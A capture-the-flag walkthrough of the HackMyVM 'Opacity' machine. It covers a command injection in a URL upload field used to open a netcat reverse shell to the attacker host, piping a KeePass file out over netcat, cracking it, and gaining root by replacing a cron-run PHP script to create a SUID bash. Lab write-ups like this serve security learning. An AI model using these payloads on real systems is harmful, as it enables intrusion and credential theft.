# Opacity

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.191:22
Open 10.0.2.191:139
Open 10.0.2.191:445
Open 10.0.2.191:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.191
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa4rFv9bD2hlJ8EgxU6clOj6v7GMUIjfAr7fzckrKGPnvxQA3ikvRKouMMUiYThvvfM7gOORL5sicN3qHS8cmRsLFjQVGyNL6/nb+MyfUJlUYk4WGJYXekoP5CLhwGqH/yKDXzdm1g8LR6afYw8fSehE7FM9AvXMXqvj+/WoC209pWu/s5uy31nBDYYfRP8VG3YEJqMTBgYQIk1RD+Q6qZya1RQDnQx6qLy1jkbrgRU9mnfhizLVsqZyXuoEYdnpGn9ogXi5A0McDmJF3hh0p01+KF2/+GbKjJrGNylgYtU1/W+WAoFSPE41VF7NSXbDRba0WIH5RmS0MDDFTy9tbKB33sG9Ct6bHbpZCFnxBi3toM3oBKYVDfbpbDJr9/zEI1R9ToU7t+RH6V0zrljb/cONTQCANYxESHWVD+zH/yZGO4RwDCou/ytSYCrnjZ6jHjJ9TWVkRpVjR7VAV8BnsS6egCYBOJqybxW2moY86PJLBVkd6r7x4nm19yX4AQPm8=
|   256 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAqe7rEbmvlsedJwYaZCIdligUJewXWs8mOjEKjVrrY/28XqW/RMZ12+4wJRL3mTaVJ/ftI6Tu9uMbgHs21itQQ=
|   256 ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINQSFcnxA8EchrkX6O0RPMOjIUZyyyQT9fM4z4DdCZyA
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Login
|_Requested resource was login.php
139/tcp open  netbios-ssn syn-ack Samba smbd 4
445/tcp open  netbios-ssn syn-ack Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   OPACITY<00>          Flags: <unique><active>
|   OPACITY<03>          Flags: <unique><active>
|   OPACITY<20>          Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-13T11:47:17
|_  start_date: N/A
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 29176/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 25825/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 30122/udp): CLEAN (Failed to receive data)
|   Check 4 (port 34490/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/opacity/writeup.png)

```bash
└─$ feroxbuster -u http://10.0.2.191 --thorough -q -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
302      GET        0l        0w        0c http://10.0.2.191/ => login.php
302      GET        0l        0w        0c http://10.0.2.191/index.php => login.php
200      GET       34l       60w      848c http://10.0.2.191/login.php
302      GET        0l        0w        0c http://10.0.2.191/logout.php => login.php
```

```bash
└─$ feroxbuster -u http://10.0.2.191 --thorough -q -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x .php
302      GET        0l        0w        0c http://10.0.2.191/ => login.php
200      GET       34l       60w      848c http://10.0.2.191/login.php
302      GET        0l        0w        0c http://10.0.2.191/index.php => login.php
302      GET        0l        0w        0c http://10.0.2.191/logout.php => login.php
301      GET        9l       28w      308c http://10.0.2.191/cloud => http://10.0.2.191/cloud/
```

![writeup-1.png](/assets/pentest/hackmyvm/opacity/writeup-1.png)

Example upload

![writeup-2.png](/assets/pentest/hackmyvm/opacity/writeup-2.png)

Inspect the incoming request
```bash
└─$ curl 'http://10.0.2.191/cloud/' --data-urlencode 'url=http://10.0.2.149/usb.php.jpg' -s | htmlq 'div.form-group:first-of-type' -tw
---
└─$ dirtypipe 80
Server on port 80...
--- Request at 2026-01-13 12:02:12 ---
Client: 10.0.2.191:56570
Method: GET
Path: /usb.php.jpg
Headers:
  User-Agent: Wget/1.20.3 (linux-gnu)
  Accept: */*
  Accept-Encoding: identity
  Host: 10.0.2.149
  Connection: Keep-Alive
==================================================
```

### Command Injection

![writeup-3.png](/assets/pentest/hackmyvm/opacity/writeup-3.png)

```bash
└─$ curl 'http://10.0.2.191/cloud/' --data-urlencode 'url=x; busybox nc 10.0.2.149 4444 -e /bin/bash; # .jpg' -s | htmlq 'div.form-group:first-of-type' -tw
---
└─$ penelope -p 4444
www-data@opacity:/var/www/html/cloud$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

There are credentials in web files, but doesn't seem useful for lateral movement.
```bash
www-data@opacity:/var/www/html$ cat login.php | sed -n '/<?php/,/?>/p'
...
$logins = array('admin' => 'oncloud9','root' => 'oncloud9','administrator' => 'oncloud9');
...
```

Keepass database for sysadmin in `/opt`
```bash
www-data@opacity:/var/www/html$ ls -Alh /opt/
total 4.0K
-rwxrwxr-x 1 sysadmin sysadmin 1.6K Jul  8  2022 dataset.kdbx
```

Open database
```bash
└─$ nc -lvnp 4445 > dataset.kdbx
---
www-data@opacity:/var/www/html$ busybox nc 10.0.2.149 4445 < /opt/dataset.kdbx
---
└─$ keepass2john dataset.kdbx > dataset.kdbx.hash
---
PS > john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
741852963        (dataset)
```

![writeup-4.png](/assets/pentest/hackmyvm/opacity/writeup-4.png)

## SSH

> Creds: `sysadmin:Cl0udP4ss40p4city#8700`

```bash
└─$ sshpass -p 'Cl0udP4ss40p4city#8700' ssh sysadmin@10.0.2.191
sysadmin@opacity:~$ id
uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),24(cdrom),30(dip),46(plugdev)
```

### User.txt

```bash
sysadmin@opacity:~$ cat local.txt
6661b61b44d234d230d06bf5b3c075e2
```

## Lateral Movement

```bash
└─$ sshpass -p 'Cl0udP4ss40p4city#8700' scp /opt/scripts/enum/pspy64 sysadmin@10.0.2.191:pspy
sysadmin@opacity:~$ chmod +x pspy
sysadmin@opacity:~$ ./pspy
...
2026/01/13 12:40:01 CMD: UID=0     PID=3243   | /usr/sbin/CRON -f
2026/01/13 12:40:01 CMD: UID=0     PID=3244   | /bin/sh -c /usr/bin/php /home/sysadmin/scripts/script.php
...
sysadmin@opacity:~$ ls -l /home/sysadmin/scripts/script.php
-rw-r----- 1 root sysadmin 519 Jul  8  2022 /home/sysadmin/scripts/script.php
```

```php
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
```

```bash
sysadmin@opacity:~$ mv scripts/ scripts.bak/
sysadmin@opacity:~$ mkdir scripts
sysadmin@opacity:~$ echo '<?= system("install -m4777 /bin/bash /tmp/rootbash"); ?>' > scripts/script.php
```

After like 3-5 minute script executes
```bash
sysadmin@opacity:~$ /tmp/rootbash -p
rootbash-5.0# id
uid=1000(sysadmin) gid=1000(sysadmin) euid=0(root) groups=1000(sysadmin),24(cdrom),30(dip),46(plugdev)
```

### Root.txt

```bash
rootbash-5.0# cat /root/proof.txt
ac0d56f93202dd57dcb2498c739fd20e
```